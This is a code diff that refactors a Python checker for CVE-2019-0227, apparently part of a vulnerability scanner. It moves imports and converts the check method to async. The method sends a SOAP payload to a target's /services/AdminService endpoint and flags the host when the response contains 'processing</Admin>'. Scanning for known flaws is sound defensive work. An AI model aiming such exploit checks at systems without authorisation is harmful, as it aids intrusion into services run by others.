@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2019_0227_BaseVerify:
     def __init__(self, url):
@@ -55,7 +55,7 @@ class CVE_2019_0227_BaseVerify:
             </soapenv:Envelope>
             '''
             
-    def check(self, filename = None):
+    async def check(self, filename = None):
         
         """
         检测是否存在漏洞
@@ -70,15 +70,12 @@ class CVE_2019_0227_BaseVerify:
                 self.check_payload = self.check_payload %('test')
             else:
                 self.check_payload = self.check_payload %(filename)
-            check_req = request.get(self.url + "/services/AdminService", headers = self.check_headers, data = self.check_payload)
-            if check_req.status_code == 200 and "processing</Admin>" in check_req.text :
+            check_req = await request.get(self.url + "/services/AdminService", headers = self.check_headers, data = self.check_payload)
+            if check_req.status == 200 and "processing</Admin>" in await check_req.text() :
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
